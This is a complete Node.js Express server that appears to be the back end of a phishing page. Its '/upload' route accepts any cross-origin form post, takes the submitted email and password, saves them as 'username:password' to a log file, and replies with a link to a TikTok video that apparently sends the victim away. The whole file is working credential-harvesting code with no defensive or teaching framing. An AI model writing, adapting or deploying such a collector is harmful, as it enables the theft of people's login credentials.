const express = require('express');
const fs = require('fs');
const app = express();
const cors = require('cors');

app.use(cors());
app.use(express.urlencoded({extended:true}));

app.post('/upload', (req, res) => {
    var username = req.body.email;
    var password = req.body.password;

    var message = username + ":" + password;

    fs.writeFile("log.txt", message, err=>{

    });
    res.send("<a href='https://www.tiktok.com/@just_udayapur_things/video/7215636848675179778?is_from_webapp=1&sender_device=pc'>Tiktok</a>")
});

app.listen(process.env.PORT);
